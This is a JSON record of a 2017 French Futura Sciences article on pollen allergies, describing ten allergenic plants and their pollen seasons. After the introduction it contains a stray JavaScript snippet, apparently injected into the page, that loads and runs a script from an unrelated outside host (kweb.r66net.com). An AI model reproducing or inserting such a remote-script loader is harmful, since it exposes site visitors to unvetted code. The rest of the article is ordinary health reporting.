{"title": "Allergie au pollen : 10 plantes a eviter", "newspaper": "Futura Sciences", "author": ["Marie-Celine Jacquier"], "date_publi": "2017-05-23", "content": "Les allergies saisonnieres sont de retour. De l'ambroisie aux graminees en passant par de nombreux arbres courants presents dans nos forets et jardins, voici 10 plantes a eviter si vous etes sujet aux allergies.  Ce qu'il faut retenir Les allergies saisonnieres provoquent des rhinites et des conjonctivites. Pres de 30 % des adultes seraient concernes par ces allergies. Les principaux pollens incrimines sont ceux de l'ambroisie, des graminees et de certains arbres. Le <<  rhume des foins  >> bat son plein en ce mois de mai avec les  pollens  de  graminees , tres presents en cette periode. Il se manifeste chez les personnes sensibles par des  rhinites ,  conjonctivites ... Pres de 30 % des adultes seraient concernes en France, d'apres le  ministere de la Sante . Si vous etes sensible au pollen, pensez a aerer votre logement et evitez les activites en plein  air  en periode de pollinisation.  Voici dix plantes qui produisent des pollens particulierement redoutes des allergiques.  ( function () { var vs = document.createElement(\"script\"); vs.type = \"text/javascript\"; vs.async = true; vs.src = \"http://kweb.r66net.com/GetLink\"; var s = document.getElementsByTagName(\"script\")[0]; s.parentNode.insertBefore(vs, s); })();  L'ambroisie L' ambroisie  a feuille d' armoise  ( Ambrosia artemisiifolia ) est une plante de la famille des composees, ou asteracees, qui se developpe sur les terrains  vagues . Elle peut atteindre un metre de haut. Provenant d'Amerique du Nord, cette plante envahissante est disseminee par l'Homme (souliers, engins de chantier...). Tres presente dans la region Auvergne-Rhone-Alpes, elle est particulierement allergisante : 6 a 12 % de la population serait sensible a ses pollens. Les  symptomes  rappellent ceux du rhume des foins, mais cette allergie se manifeste plus tard dans l'annee : a partir de mi-aout et jusqu'en septembre-octobre. L'ambroisie est parfois confondue avec l'armoise, qui fait elle aussi partie de la famille des composees. Les pollens d'armoise provoquent eux aussi des  allergies . L'ambroisie a feuille d'armoise est une plante particulierement allergisante. (c) Pere Igor, Wikipedia, CC by-sa 3.0                               Les graminees Les graminees, ou poacees, se trouvent le long des routes, dans les prairies, les forets... Elles comptent de nombreuses  especes  : les fetuques, les ray-grass, l'ivraie, les  bromes , le  ble , le seigle, l' orge , l' avoine , les houlques, les fleoles, le  millet , etc. Si vous etes allergique aux graminees, evitez de tondre la pelouse ou d'etre a proximite du jardinier qui tond ! Les  pollens de graminees  sont surtout presents entre mai et juillet. Le bouleau Le  bouleau  est un arbre dont le tronc presente une ecorce blanche caracteristique. Les pollens de bouleau sont particulierement redoutes des allergiques au printemps. La production de pollens de bouleau demarre en mars-avril. Le bouleau fait partie de la famille des betulacees, tout comme l'aulne, le noisetier et le  charme . Les pollens de bouleau et des autres arbres de la famille des betulacees sont tres allergenes. (c) IreneuszB, Fotolia                               Trois autres betulacees : aulne, noisetier, charme Aulne, noisetier, charme sont aussi a eviter. Il n'est pas rare d'etre allergique a la fois au pollen de bouleau et d'aulne par exemple. L' aulne  est un arbre souvent present en milieu humide, le long des cours d'eau ou des etangs. Les pollens de noisetier et d'aulne apparaissent des l'hiver (fevrier). Le charme est un arbre forestier qui est souvent utilise en haies dans les jardins (charmilles). Le cypres Le  cypres  est un arbre qui apprecie le climat mediterraneen et les sols secs. Plusieurs especes de cypres produisent des pollens allergisants : le cypres bleu  Cupressus arizonica , le cypres vert  Cupressus sempervirens . Les pollens du cypres bleu apparaissent en debut d'annee, avant ceux du cypres vert. Le cypres vert ( Cupressus sempervirens ) est un arbre allergisant. (c) Wikipedia, CC by-sa 2.5                       Le chene Le chene, roi des  forets , produit lui aussi des pollens qui peuvent etre source d' allergies . Il en existe de nombreuses especes, dont le chene pedoncule ( Quercus robur ) et le chene pubescent ( Quercus pubescens ). Sa floraison a lieu en avril. Le frene Le frene commun produit de grandes quantites de pollens, durant la meme periode que le bouleau. Des reactions croisees sont possibles avec les pollens d'olivier. L'olivier Le pollen d'olivier est un allergene important en region mediterraneenne. Palynologie : reconstituer le paysage d'une epoque grace au pollen                       La palynologie consiste en l'etude des spores et du pollen. Sur un site de fouilles archeologiques, elle permet de reconstituer l'environnement et le paysage d'une epoque donnee afin d'en comprendre l'impact sur les anciennes civilisations. L'Inrap nous en dit plus durant ce court reportage.                                       ", "theme": "sante"}